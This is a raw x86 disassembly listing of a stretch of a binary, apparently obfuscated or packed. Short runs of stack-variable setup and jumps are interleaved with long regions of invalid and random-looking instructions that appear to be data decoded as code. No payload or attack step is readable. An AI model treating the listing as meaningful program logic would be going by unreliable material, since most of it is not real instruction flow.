  414170:	js     0x414142
  414172:	xor    al,0xb5
  414174:	and    ebx,esi
  414176:	fwait
  414177:	nop
  414178:	fwait
  414179:	std    
  41417a:	sti    
  41417b:	mov    BYTE PTR [ebx+edx*8],ch
  41417e:	pop    esp
  41417f:	push   ss
  414180:	es pop ebp
  414182:	xchg   esi,eax
  414183:	jg     0x414152
  414185:	ds ss nop
  414188:	lea    ebx,[ebp+0x2b]
  41418b:	jb     0x4141fb
  41418d:	or     al,0xd1
  41418f:	pop    ecx
  414190:	cli    
  414191:	pop    edx
  414192:	stc    
  414193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414194:	add    BYTE PTR ds:0xe2d2b95d,ah
  41419a:	aaa    
  41419b:	sub    al,0x9f
  41419d:	aad    0xd3
  41419f:	cmp    eax,0x53e0e68c
  4141a4:	cmp    al,0xf1
  4141a6:	and    DWORD PTR [ecx],eax
  4141a8:	js     0x414148
  4141aa:	or     edi,DWORD PTR [esi+0x2c]
  4141ad:	ret    0x44f6
  4141b0:	fist   DWORD PTR [ebx-0xdf41407]
  4141b6:	jno    0x414213
  4141b8:	int3   
  4141b9:	mov    ds:0x25a5bd8a,eax
  4141be:	stos   DWORD PTR es:[edi],eax
  4141bf:	mov    ebx,0x8d08658a
  4141c4:	xchg   esi,eax
  4141c5:	das    
  4141c6:	adc    DWORD PTR [ebx],ebp
  4141c8:	sub    ah,dh
  4141ca:	xchg   edx,eax
  4141cb:	out    dx,eax
  4141cc:	mov    DWORD PTR [edi+0x40],edi
  4141cf:	pusha  
  4141d0:	mov    ebp,0x366dc081
  4141d5:	arpl   WORD PTR [ecx-0x8c92459],bp
  4141db:	call   0x81a77557
  4141e0:	mov    al,ds:0xc36e733b
  4141e5:	and    al,0x1b
  4141e7:	mov    ah,0x7d
  4141e9:	mov    al,0xa5
  4141eb:	test   eax,0xc1213e68
  4141f0:	adc    DWORD PTR [ebx],edx
  4141f2:	outs   dx,BYTE PTR ds:[esi]
  4141f3:	mov    edx,0x3f9ce100
  4141f8:	in     eax,0xd1
  4141fa:	stc    
  4141fb:	aas    
  4141fc:	cs fdiv st(1),st
  4141ff:	pop    ss
  414200:	or     ecx,DWORD PTR [edi+0x2d]
  414203:	sbb    al,0xad
  414205:	cmc    
  414206:	pop    ds
  414207:	dec    edx
  414208:	ins    BYTE PTR es:[edi],dx
  414209:	mov    edx,0xa28653b4
  41420e:	(bad)  
  41420f:	ja     0x414237
  414211:	dec    ebx
  414212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414213:	sub    DWORD PTR [esi+esi*8],edx
  414216:	or     ah,BYTE PTR [ebx-0x63056497]
  41421c:	test   eax,0xf9c17940
  414221:	mov    bh,0xf4
  414223:	test   ecx,ebx
  414225:	addr16 mov bl,0xe5
  414228:	inc    esp
  414229:	xor    eax,0xdb448815
  41422e:	dec    esp
  41422f:	test   al,0xc1
  414231:	ret    
  414232:	mov    esi,0x12a90e02
  414237:	pop    ebx
  414238:	jb     0x414285
  41423a:	mov    ch,BYTE PTR [esp+eiz*4]
  41423d:	mov    ?,WORD PTR [edx]
  41423f:	loope  0x41424b
  414241:	xchg   DWORD PTR ds:[ebx+0x5c4c0f5f],esi
  414248:	bound  eax,QWORD PTR [ecx+0x1db5ebff]
  41424e:	loope  0x4142c6
  414250:	lea    ebx,[ebp-0x58ec029f]
  414256:	(bad)  
  414257:	cli    
  414258:	lods   al,BYTE PTR ds:[esi]
  414259:	push   ss
  41425a:	or     edi,DWORD PTR [eax]
  41425c:	mov    esi,0xe994f974
  414261:	cmp    BYTE PTR [esi+0x31775a36],ch
  414267:	push   cs
  414268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414269:	add    ebp,ebp
  41426b:	inc    esp
  41426c:	mov    bl,0x43
  41426e:	ins    BYTE PTR es:[edi],dx
  41426f:	push   cs
  414270:	outs   dx,DWORD PTR ds:[esi]
  414271:	xor    al,0xdb
  414273:	aad    0x70
  414275:	xchg   ebx,eax
  414276:	or     al,0xec
  414278:	inc    ecx
  414279:	pop    ds
  41427a:	les    esi,FWORD PTR [edx]
  41427c:	out    0x68,al
  41427e:	fldcw  WORD PTR [esi]
  414280:	call   0x99ad4876
  414285:	xchg   ebp,eax
  414286:	pop    edi
  414287:	push   eax
  414288:	and    al,0x43
  41428a:	(bad)  
  41428c:	popa   
  41428d:	and    eax,0x6ac3323e
  414292:	loop   0x41427c
  414294:	fdiv   QWORD PTR [edi-0x22893efb]
  41429a:	aam    0x70
  41429c:	scas   al,BYTE PTR es:[edi]
  41429d:	xor    ch,BYTE PTR [ebp+0x2cffebaa]
  4142a3:	xchg   edx,eax
  4142a4:	sub    eax,0xecb5f741
  4142a9:	mov    al,ds:0x5853c92a
  4142ae:	xor    ch,cl
  4142b0:	shl    DWORD PTR ds:[esi+0x4a7f3518],1
  4142b7:	inc    ebp
  4142b8:	push   ecx
  4142b9:	sub    cl,ch
  4142bb:	mov    DWORD PTR [edx+0x33],esi
  4142be:	cmp    BYTE PTR [ebp+0x3e4a569],al
  4142c4:	into   
  4142c5:	paddusb mm0,mm0
  4142c8:	retf   0xa1e4
  4142cb:	adc    ebx,DWORD PTR [edx+0x381da701]
  4142d1:	xor    ah,BYTE PTR [ecx+0x714b4499]
  4142d7:	adc    BYTE PTR [esi+esi*2-0x6a],bl
  4142db:	out    dx,eax
  4142dc:	imul   esi,DWORD PTR [edx],0xddeb5b5f
  4142e2:	ficomp WORD PTR [edx-0x59]
  4142e5:	dec    eax
  4142e6:	dec    edi
  4142e7:	push   esi
  4142e8:	aas    
  4142e9:	jbe    0x41434e
  4142eb:	popf   
  4142ec:	mov    ds:0x97076aae,al
  4142f1:	mov    WORD PTR [ecx+0x5da7adc5],gs
  4142f7:	fdiv   DWORD PTR [edi-0x1f]
  4142fa:	jecxz  0x41430a
  4142fc:	mov    al,ds:0x3154f2f7
  414301:	clc    
  414302:	xchg   ebx,esp
  414304:	fwait
  414305:	inc    esi
  414306:	data16 ror BYTE PTR [edx],1
  414309:	mov    ds:0x30ac82dc,al
  41430e:	push   ecx
  41430f:	mov    DWORD PTR [eax],esi
  414311:	lds    ebp,FWORD PTR [edx*2+0x20a67dd2]
  414318:	mov    esi,0x584b2516
  41431d:	jle    0x414351
  41431f:	sbb    ebx,DWORD PTR [ecx-0x6479e9c8]
  414325:	mov    edi,0x3aa3e8b2
  41432a:	jns    0x4142ec
  41432c:	push   0x2e53d2b1
  414331:	jb     0x4143a4
  414333:	or     ch,al
  414335:	and    al,0xe9
  414337:	les    esi,FWORD PTR [ebp+0x5b2d9f38]
  41433d:	mov    esi,0x58483c37
  414342:	lods   al,BYTE PTR ds:[esi]
  414343:	add    edi,DWORD PTR [ecx]
  414345:	fild   DWORD PTR [eax]
  414347:	pusha  
  414348:	inc    edx
  414349:	nop
  41434a:	test   al,0x66
  41434c:	push   eax
  41434d:	lahf   
  41434e:	shl    edx,0x7
  414351:	xchg   esi,eax
  414352:	sar    DWORD PTR [eax-0x61],0x1e
  414356:	mov    ebx,esp
  414358:	or     DWORD PTR [ebp-0x691548ca],esp
  41435e:	xchg   dh,al
  414360:	imul   esi,edi,0xaef1b778
  414366:	sub    ebp,ebx
  414368:	and    edx,DWORD PTR [ebx-0x6b]
  41436b:	stc    
  41436c:	loop   0x41434c
  41436e:	sub    BYTE PTR [edx-0x33],dl
  414371:	and    dl,BYTE PTR [edi+0x780cbe39]
  414377:	xchg   ecx,eax
  414378:	data16 not BYTE PTR [esi+0x48]
  41437c:	in     al,dx
  41437d:	push   cs
  41437e:	mov    BYTE PTR [ecx+0x77],bl
  414381:	xor    eax,0x2ce42ba8
  414386:	dec    ebx
  414387:	jnp    0x414335
  414389:	mov    eax,ds:0x4e86b8bf
  41438e:	add    cl,BYTE PTR [esi]
  414390:	inc    eax
  414391:	pop    ecx
  414392:	(bad)  
  414393:	rcr    DWORD PTR [ebp-0x33],0xb5
  414397:	mov    ch,0x25
  414399:	loop   0x4143a9
  41439b:	mov    esi,edx
  41439d:	inc    ecx
  41439e:	stc    
  41439f:	nop
  4143a0:	xchg   ecx,eax
  4143a1:	das    
  4143a2:	ret    
  4143a3:	arpl   WORD PTR [bx+si],si
  4143a6:	mov    al,0xff
  4143a8:	inc    esi
  4143a9:	add    DWORD PTR [eax],edi
  4143ab:	push   ebp
  4143ac:	cld    
  4143ad:	push   ds
  4143ae:	pop    ebp
  4143af:	cmp    BYTE PTR [edi],al
  4143b1:	mov    eax,0xae668a87
  4143b6:	or     eax,0xd43b1017
  4143bb:	mov    esp,0xc12f624d
  4143c0:	sbb    esp,edi
  4143c2:	cmp    BYTE PTR [edx],ch
  4143c4:	xchg   esi,eax
  4143c5:	jge    0x4143b2
  4143c7:	(bad)  
  4143c8:	cwde   
  4143c9:	xor    BYTE PTR [esi+0x73],0xbb
  4143cd:	fwait
  4143ce:	shl    DWORD PTR [ecx-0x6f],0xa2
  4143d2:	mov    eax,ebx
  4143d4:	mov    esp,0xdeb0d37c
  4143d9:	sbb    ebx,ebp
  4143db:	mov    ds:0x7aae3212,al
  4143e0:	or     ch,BYTE PTR [ebx+0x591166b1]
  4143e6:	sbb    dl,BYTE PTR [edx+edi*2]
  4143e9:	cmp    esp,DWORD PTR [edx-0x57ea5fbd]
  4143ef:	xchg   esp,eax
  4143f0:	mov    ?,WORD PTR [esi]
  4143f2:	rcl    DWORD PTR [edx],0x12
  4143f5:	mov    ah,0x51
  4143f7:	mov    al,ds:0x4b0e77b4
  4143fc:	dec    ebx
  4143fd:	add    DWORD PTR [edx+0xcb47356],edx
  414403:	gs data16 and dh,ch
  414407:	test   BYTE PTR [ebx-0x12deb47b],bh
  41440d:	sbb    bl,BYTE PTR [edi]
  41440f:	aam    0x95
  414411:	out    0xc1,al
  414413:	lahf   
  414414:	ja     0x4143a3
  414416:	jo     0x4143a5
  414418:	repz dec esp
  41441a:	push   0x3a055c2e
  41441f:	cs loopne 0x4143f7
  414422:	add    DWORD PTR [edi-0x461520d3],ebx
  414428:	lahf   
  414429:	mov    ebp,0xed287f00
  41442e:	loope  0x4143b4
  414430:	scas   eax,DWORD PTR es:[edi]
  414431:	mov    es,WORD PTR [edx+edx*8+0x5dd26a7e]
  414438:	ja     0x4143bd
  41443a:	mov    ds:0xce3d05b7,al
  41443f:	(bad)  
  414440:	jge    0x4144ae
  414442:	mov    al,0xca
  414444:	mov    edi,0xf1f62704
  414449:	xlat   BYTE PTR ds:[ebx]
  41444a:	retf   
  41444b:	and    ebp,DWORD PTR [edi+0x7d]
  41444e:	mov    ds:0xe41e19b8,al
  414453:	xchg   edx,eax
  414454:	mov    ebx,0xbe5c1a34
  414459:	jns    0x41444a
  41445b:	xchg   esi,eax
  41445c:	dec    eax
  41445d:	push   ebx
  41445e:	xchg   edx,eax
  41445f:	mov    dl,BYTE PTR [ecx+0x7d]
  414462:	xchg   bl,dl
  414464:	mov    ah,0x67
  414466:	(bad)  
  414467:	push   ecx
  414468:	fwait
  414469:	cmp    bl,bl
  41446b:	xor    BYTE PTR [ebp-0x42fe14fb],cl
  414471:	loope  0x4144ac
  414473:	cwde   
  414474:	sbb    DWORD PTR [edx+0x7baabcea],0xffffffce
  41447b:	frstor [edx]
  41447d:	imul   BYTE PTR ds:0x6657acfa
  414483:	imul   eax,DWORD PTR [ebx],0xffffff8f
  414486:	int3   
  414487:	adc    dl,dh
  414489:	dec    eax
  41448a:	leave  
  41448b:	mov    dl,0xf9
  41448d:	mov    al,0x93
  41448f:	sti    
  414490:	outs   dx,BYTE PTR ds:[esi]
  414491:	(bad)  
  414492:	fcmovnb st,st(4)
  414494:	add    ch,BYTE PTR ds:0xa7758811
  41449a:	mov    ebx,0x49efc3fa
  41449f:	jo     0x414516
  4144a1:	mov    cl,al
  4144a3:	jo     0x4144f8
  4144a5:	in     eax,dx
  4144a6:	mov    esp,gs
  4144a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a9:	clc    
  4144aa:	in     eax,dx
  4144ab:	mov    esi,0x6912e91
  4144b0:	sub    ah,BYTE PTR [eax-0x7a52b183]
  4144b6:	xchg   edx,eax
  4144b7:	push   cs
  4144b8:	cmp    eax,DWORD PTR [ebp-0x4e2a699d]
  4144be:	cmp    eax,0x84d9d8e7
  4144c3:	sahf   
  4144c4:	outs   dx,DWORD PTR ds:[si]
  4144c6:	stos   DWORD PTR es:[edi],eax
  4144c7:	inc    esi
  4144c8:	xor    ah,al
  4144ca:	jmp    0x414524
  4144cc:	push   edx
  4144cd:	mov    ebx,0xa0eee0c3
  4144d2:	mov    BYTE PTR [ebp+0x4dc11154],al
  4144d8:	jg     0x414535
  4144da:	ss out 0x31,al
  4144dd:	mov    ebx,0x3f251f22
  4144e2:	cmp    ecx,DWORD PTR [eax+0x45]
  4144e5:	(bad)  
  4144e6:	(bad)  
  4144e7:	imul   ecx,DWORD PTR [esi+0x48b3a4a4],0xffffffd3
  4144ee:	and    eax,0x40ca5cab
  4144f3:	(bad)  
  4144f4:	add    eax,0xc887ae85
  4144f9:	fist   DWORD PTR [esi]
  4144fb:	mov    eax,0x35f08033
  414500:	in     eax,dx
  414501:	mov    ebp,0x4aac250c
  414506:	xchg   DWORD PTR [ebx-0x384d685f],ecx
  41450c:	inc    ebp
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x947c:0x73623c4c
  414595:	ret    0x6a35
  414598:	shl    BYTE PTR [eax+ebx*1],cl
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    dh,cl
  4145a1:	mov    bh,0x80
  4145a3:	es add eax,0x3814c334
  4145a9:	mov    ecx,0x78aae580
  4145ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145af:	lahf   
  4145b0:	int    0x76
  4145b2:	adc    esp,eax
  4145b4:	jns    0x4145a4
  4145b6:	jnp    0x414592
  4145b8:	jecxz  0x4145a0
  4145ba:	lds    eax,FWORD PTR [ebx+0x6a]
  4145bd:	xlat   BYTE PTR ds:[ebx]
  4145be:	jns    0x41461e
  4145c0:	out    dx,eax
  4145c1:	or     eax,0xf405b1ee
  4145c6:	mov    BYTE PTR [ebp+0x410173a8],bl
  4145cc:	mov    ebp,0x1c3c454d
  4145d1:	hlt    
  4145d2:	dec    ecx
  4145d3:	jno    0x414650
  4145d5:	dec    esp
  4145d6:	and    ch,BYTE PTR [esi-0x67]
  4145d9:	sbb    eax,DWORD PTR [ebp-0x1e5f2788]
  4145df:	or     ah,BYTE PTR [edi+0x7d040a68]
  4145e5:	mov    WORD PTR [edx+0x44433cff],gs
  4145eb:	adc    edx,ebp
  4145ed:	adc    esp,eax
  4145ef:	dec    ebx
  4145f0:	int    0xf9
  4145f2:	fadd   QWORD PTR [ecx+0x7480325b]
  4145f8:	daa    
  4145f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145fa:	adc    bh,dl
  4145fc:	ss jl  0x414646
  4145ff:	les    ebp,FWORD PTR [ebp-0x5267c1f3]
  414605:	mov    BYTE PTR [esi+0x7be2ec9b],0x52
  41460c:	jle    0x41462a
  41460e:	out    dx,al
  41460f:	retf   0x612c
  414612:	jnp    0x414617
  414614:	in     eax,0x0
  414616:	inc    BYTE PTR [eax-0x26]
  414619:	cmp    DWORD PTR [eax+0x47d6b0b0],eax
  41461f:	cld    
  414620:	jbe    0x4145cc
  414622:	xchg   esp,eax
  414623:	dec    ecx
  414624:	scas   al,BYTE PTR es:[edi]
  414625:	and    eax,0x87a43b78
  41462a:	pop    ds
  41462b:	mov    BYTE PTR [ebp-0x501dc94c],dh
  414631:	rcr    DWORD PTR [edx],cl
  414633:	push   eax
  414634:	dec    eax
  414635:	ins    BYTE PTR es:[edi],dx
  414636:	push   edi
  414637:	lds    edi,FWORD PTR [eax+0x4c8b5fd4]
  41463d:	out    dx,al
  41463e:	leave  
  41463f:	in     al,0xf6
  414641:	mov    esi,0x6e8d8d26
  414646:	lods   eax,DWORD PTR ds:[esi]
  414647:	dec    ecx
  414648:	dec    edx
  414649:	cli    
  41464a:	mov    DWORD PTR [esi-0x3a],esp
  41464d:	xchg   ebx,eax
  41464e:	pop    ss
  41464f:	mov    al,0x86
  414651:	fistp  WORD PTR [esi-0x69]
  414654:	xchg   edi,eax
  414655:	add    BYTE PTR [eax],cl
  414657:	add    dh,BYTE PTR [ecx+ecx*4+0x44]
  41465b:	push   edx
  41465c:	fdivr  DWORD PTR [edx+esi*4-0x2f009215]
  414663:	pop    ecx
  414664:	je     0x4146da
  414666:	pushf  
  414667:	pop    esi
  414668:	(bad)  
  414669:	xor    dl,bl
  41466b:	outs   dx,DWORD PTR ds:[esi]
  41466c:	lods   eax,DWORD PTR ds:[esi]
  41466d:	add    BYTE PTR [edx-0xc],bh
  414670:	pop    ebp
  414671:	mov    ebx,0x87bb0e56
  414676:	mov    dl,BYTE PTR [ebp+edx*8+0x4fe88b1c]
  41467d:	lods   al,BYTE PTR ds:[esi]
  41467e:	(bad)  
  41467f:	or     al,0xbf
  414681:	hlt    
  414682:	fcom   QWORD PTR [edi]
  414684:	test   esp,0x2dbb7098
  41468a:	cmp    DWORD PTR [edx-0x53a080ea],edi
  414690:	add    al,0x6f
  414692:	pushf  
  414693:	imul   eax,DWORD PTR [eax-0x74],0x3e36b5d3
  41469a:	pop    ss
  41469b:	std    
  41469c:	and    al,BYTE PTR [ebx+0x25c05b17]
  4146a2:	stos   DWORD PTR es:[edi],eax
  4146a3:	jl     0x414718
  4146a5:	sub    ebp,DWORD PTR [edi+0x7524f712]
  4146ab:	icebp  
  4146ac:	or     BYTE PTR [edx+0x489ae587],bh
  4146b2:	jae    0x41468d
  4146b4:	jmp    0xe0ce550a
  4146b9:	mov    ah,0x83
  4146bb:	sub    DWORD PTR ds:[eax+0x622eb21b],0x68843ab5
  4146c6:	outs   dx,BYTE PTR ds:[esi]
  4146c7:	xchg   ebx,eax
  4146c8:	mov    BYTE PTR [eax],al
  4146ca:	xchg   ebp,eax
  4146cb:	int    0x9a
  4146cd:	xor    ecx,DWORD PTR [edi+0x90ee359]
  4146d3:	pop    ecx
  4146d4:	dec    edi
  4146d5:	aaa    
  4146d6:	mov    al,0xa0
  4146d8:	cvtps2pd xmm0,QWORD PTR [ecx+esi*1+0x68a452ef]
  4146e0:	or     eax,0x405b3c10
  4146e5:	adc    DWORD PTR [ebx-0x45569b0c],eax
  4146eb:	and    al,0x24
  4146ed:	das    
  4146ee:	dec    ebp
  4146ef:	and    eax,0x129590bb
  4146f4:	loopne 0x4146d2
  4146f6:	mov    WORD PTR [esi+eiz*1-0x4],gs
  4146fa:	call   0xe8ff:0x1cd6b2c3
  414701:	and    al,BYTE PTR [eax+0x7]
  414704:	mov    esi,DWORD PTR [eax-0x42]
  414707:	pusha  
  414708:	stos   DWORD PTR es:[edi],eax
  414709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41470a:	jnp    0x4146ca
  41470c:	push   ecx
  41470d:	pop    ss
  41470e:	pop    edi
  41470f:	fs dec ebx
  414711:	mov    ecx,0xd5289c3d
  414716:	sbb    DWORD PTR [esi+0xe4f08fc],0x76
  41471d:	inc    esp
  41471e:	push   0xf75c967a
  414723:	inc    eax
  414724:	sbb    bl,ah
  414726:	(bad)  
  414727:	(bad)  
  414728:	xchg   edi,eax
  414729:	(bad)  
  41472a:	fild   QWORD PTR ds:0x1ac6d4e
  414730:	nop
  414731:	mov    al,ds:0x675ac1ce
  414736:	sbb    dl,bh
  414738:	loope  0x41479f
  41473a:	xor    eax,0x200995c0
  41473f:	push   es
  414740:	cs mov edx,0x4264873b
  414746:	ret    
  414747:	mov    es,WORD PTR [ebx-0xb0b02d6]
  41474d:	loope  0x4146d6
  41474f:	dec    ebx
  414750:	xchg   ecx,eax
  414751:	lock xor ebp,DWORD PTR [eax-0x66]
  414755:	cmp    dl,ah
  414757:	and    bl,bh
  414759:	jbe    0x414771
  41475b:	rcr    ebx,cl
  41475d:	loopne 0x4147d3
  41475f:	inc    esp
  414760:	out    0x82,eax
  414762:	add    BYTE PTR [ecx+0x30],ah
  414765:	stos   DWORD PTR es:[edi],eax
  414766:	(bad)  
  414767:	sub    al,0x72
  414769:	xor    esi,esi
  41476b:	mov    esi,0x82e4593b
  414770:	jnp    0x41478c
  414772:	in     eax,dx
  414773:	rcl    al,cl
  414775:	shl    BYTE PTR [edx+ebx*2],0x0
  414779:	fsub   DWORD PTR [ebx-0x5fbd3d91]
  41477f:	sbb    DWORD PTR [ecx-0x69],0x4a752faa
  414786:	push   ebp
  414787:	nop
  414788:	test   DWORD PTR [edi-0xc],eax
  41478b:	ds (bad) 
  41478d:	mov    edx,0x703f4a8d
  414792:	or     bh,BYTE PTR [ebp+eax*8-0x23fef41]
  414799:	arpl   WORD PTR [esi-0x18],cx
  41479c:	cmc    
  41479d:	mov    esi,0x919a23b1
  4147a2:	out    0xb1,al
  4147a4:	dec    esi
  4147a5:	dec    esp
  4147a6:	mov    esi,0xa2ac9a09
  4147ab:	ins    DWORD PTR es:[edi],dx
  4147ac:	js     0x4147f4
  4147ae:	cmp    eax,0x502ce0c3
  4147b3:	mov    eax,ds:0x30f72730
  4147b8:	push   esi
  4147b9:	xchg   ecx,edx
  4147bb:	push   ds
  4147bc:	jb     0x41475f
  4147be:	mov    ch,BYTE PTR [eax]
  4147c0:	pop    edi
  4147c1:	out    dx,eax
  4147c2:	int3   
  4147c3:	cdq    
  4147c4:	or     al,0x8
  4147c6:	xor    edi,DWORD PTR [esi-0x7]
  4147c9:	icebp  
  4147ca:	fstp   QWORD PTR es:[edx]
  4147cd:	mov    ebx,0x40a06051
  4147d2:	pop    esp
  4147d3:	add    al,dh
  4147d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d6:	push   esi
  4147d7:	add    BYTE PTR [ebx+0x1d3db563],0xae
  4147de:	or     ch,BYTE PTR [eax-0x1d]
  4147e1:	mov    al,ah
  4147e3:	mov    esi,0xf1ec0097
  4147e8:	in     eax,0x5e
  4147ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147eb:	or     eax,0x2e122a34
  4147f0:	adc    dh,ah
  4147f2:	push   es
  4147f3:	out    dx,al
  4147f4:	mov    esp,0xd49f915a
  4147f9:	jmp    0xe903e683
  4147fe:	dec    esp
  4147ff:	add    DWORD PTR [edi+ebp*2],esp
  414802:	pop    esi
  414803:	es mov eax,0xf18aa50d
  414809:	push   cx
  41480b:	inc    ebp
  41480c:	das    
  41480d:	sahf   
  41480e:	mov    edi,0xe6222b18
  414813:	aas    
  414814:	repz mov dl,0xa7
  414817:	cmp    ah,ah
  414819:	fimul  WORD PTR [ecx-0x6]
  41481c:	cmp    al,0xa5
  41481e:	add    al,0xb7
  414820:	icebp  
  414821:	sbb    DWORD PTR [ebp-0x442b2869],edi
  414827:	rcl    edx,cl
  414829:	stos   BYTE PTR es:[edi],al
  41482a:	dec    edi
  41482b:	add    BYTE PTR [ebx-0x2450e345],dh
  414831:	push   ds
  414832:	iret   
  414833:	cli    
  414834:	cwde   
  414835:	sub    BYTE PTR [esi+0x28],bl
  414838:	mov    bl,BYTE PTR [ecx]
  41483a:	dec    esi
  41483b:	fild   WORD PTR [esi+0x4c5e6829]
  414841:	mov    cl,0x99
  414843:	aam    0x1a
  414845:	in     al,dx
  414846:	ja     0x41485c
  414848:	jmp    ecx
  41484a:	test   BYTE PTR [eax+0x40bfb7a7],ch
  414850:	or     DWORD PTR [ebx+0x4ffb065b],esi
  414856:	popa   
  414857:	inc    edi
  414858:	rol    DWORD PTR [esi+0x19b919ae],0x8f
  41485f:	inc    ecx
  414860:	and    eax,0x24768624
  414865:	xchg   esi,eax
  414866:	call   0x31adae0d
  41486b:	(bad)
  41486e:	add    al,0x69
  414870:	inc    edx
  414871:	cmp    BYTE PTR [esp+esi*1-0x48],ch
  414875:	add    BYTE PTR [edx-0x1c13e41e],ch
  41487b:	ja     0x4148b3
  41487d:	lods   eax,DWORD PTR ds:[esi]
  41487e:	xchg   esp,eax
  41487f:	xchg   ebp,eax
  414880:	enter  0xdcd4,0xf4
  414884:	shl    DWORD PTR [edx-0x6cb7fa2c],cl
  41488a:	mov    ah,0x4d
  41488c:	and    al,0xc0
  41488e:	xchg   edi,eax
  41488f:	pop    ds
  414890:	daa    
  414891:	sahf   
  414892:	inc    edi
  414893:	scas   al,BYTE PTR es:[edi]
  414894:	adc    al,ah
  414896:	arpl   WORD PTR [ebx+0x51454811],sp
  41489c:	pop    ss
  41489d:	imul   esp,DWORD PTR [edi],0x2a0bac20
  4148a3:	add    bp,cx
  4148a6:	push   0xc3be846
  4148ab:	jns    0x414838
  4148ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ae:	pop    edx
  4148af:	ja     0x41488d
  4148b1:	mov    bh,0xab
  4148b3:	jmp    0xc3fb62ee
  4148b8:	inc    eax
  4148b9:	sbb    al,BYTE PTR [esi-0x6d9a096c]
  4148bf:	mov    ecx,0xcde96fb7
  4148c4:	mov    ds,WORD PTR [edx]
  4148c6:	pop    ecx
  4148c7:	imul   BYTE PTR [ebx]
  4148c9:	mov    al,ds:0x4d902f46
  4148ce:	mov    bh,0x77
  4148d0:	adc    BYTE PTR [edx],bh
  4148d2:	mov    eax,ds:0xe12d1e53
  4148d7:	mov    esi,0xc0b1da6b
  4148dc:	scas   eax,DWORD PTR es:[edi]
  4148dd:	nop
  4148de:	rcr    BYTE PTR [ebp-0x1a],1
  4148e1:	icebp  
  4148e2:	mov    ebp,0x24e2d7be
  4148e7:	push   ecx
  4148e8:	aaa    
  4148e9:	dec    edx
  4148ea:	lods   al,BYTE PTR ds:[esi]
  4148eb:	popa   
  4148ec:	dec    eax
  4148ed:	jmp    0xb393fe21
  4148f2:	test   eax,0x36388234
  4148f7:	sub    BYTE PTR [esi],ah
  4148f9:	imul   edx,DWORD PTR [edi-0x4a],0xffffff96
  4148fd:	or     BYTE PTR ds:0x92691c18,al
  414903:	xor    bh,BYTE PTR [edi-0x72]
  414906:	or     al,BYTE PTR [ecx]
  414908:	xor    al,0x4a
  41490a:	js     0x4148bd
  41490c:	add    edx,ebx
  41490e:	rol    dl,1
  414910:	fs lahf 
  414912:	push   ss
  414913:	aam    0xdd
  414915:	ins    DWORD PTR es:[edi],dx
  414916:	dec    ecx
  414917:	outs   dx,BYTE PTR ds:[esi]
  414918:	mov    ebx,0x84ff60a4
  41491d:	pop    ebp
  41491e:	jp     0x4148d5
  414920:	cmp    al,0x17
  414922:	cmp    DWORD PTR [ebp+0x14],0x2a
  414926:	mov    bl,0xa3
  414928:	jl     0x414950
  41492a:	in     al,0x44
  41492c:	add    al,0x17
  41492e:	sbb    edx,DWORD PTR [edi]
  414930:	test   ecx,esi
  414932:	shr    esp,0x8a
  414935:	mov    bl,0xd6
  414937:	xchg   ecx,eax
  414938:	(bad)  
  414939:	lea    ecx,[esi+0x7b4b5353]
  41493f:	push   esp
  414940:	out    dx,eax
  414941:	mov    ecx,0x39dcaf38
  414946:	js     0x4149c0
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x5a
  414996:	outs   dx,BYTE PTR ds:[esi]
  414997:	retf   
  414998:	jo     0x414925
  41499a:	sbb    al,0x18
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [esi-0x7a],dh
  4149a3:	out    0x30,al
